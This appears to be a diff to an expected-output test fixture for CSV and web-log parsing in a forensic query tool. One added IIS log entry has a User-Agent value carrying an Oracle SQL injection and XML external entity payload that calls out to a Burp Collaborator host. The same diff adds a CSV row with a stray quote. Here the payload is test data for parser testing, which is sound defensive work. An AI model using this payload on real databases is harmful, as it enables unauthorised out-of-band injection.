@@ -151,6 +151,22 @@ SELECT * FROM parse_csv( filename=srcDir + "/artifacts/testdata/files/csv/autoru
   "sc-substatus": 0,
   "sc-win32-status": 0,
   "time-taken": 332
+ },
+ {
+  "date_time": "2021-07-15T08:07:36",
+  "s-ip": "10.11.12.13",
+  "cs-method": "GET",
+  "cs-uri-stem": "/some_url_from_my_website/",
+  "cs-uri-query": "-",
+  "s-port": 80,
+  "cs-username": "-",
+  "c-ip": "13.12.11.10",
+  "cs(User-Agent)": "(select+extractvalue(xmltype('\u003c?xml+version=\"1.0\"+encoding=\"UTF-8\"?\u003e\u003c!DOCTYPE+root+[+\u003c!ENTITY+%+cveec+SYSTEM+\"http://ta7y99sc16vh9tvo5z7z1crsxj3cr2f530qqef.burpcollab'||'orator.net/\"\u003e%cveec;]\u003e'),'/l')+from+dual)",
+  "cs(Referer)": "-",
+  "sc-status": 200,
+  "sc-substatus": 0,
+  "sc-win32-status": 0,
+  "time-taken": 15
  }
 ]LET PathBad = srcDir + "/artifacts/testdata/files/csv/bad.csv"[]SELECT * FROM parse_csv(filename=PathBad)[
  {
@@ -160,6 +176,10 @@ SELECT * FROM parse_csv( filename=srcDir + "/artifacts/testdata/files/csv/autoru
  {
   "Foo": "Second with trailing space      ",
   "Bar": "Some other field"
+ },
+ {
+  "Foo": "Line with illegal \" quote will be parsed",
+  "Bar": "Field with proper quote"
  },
  {
   "Foo": "field with \" quote",
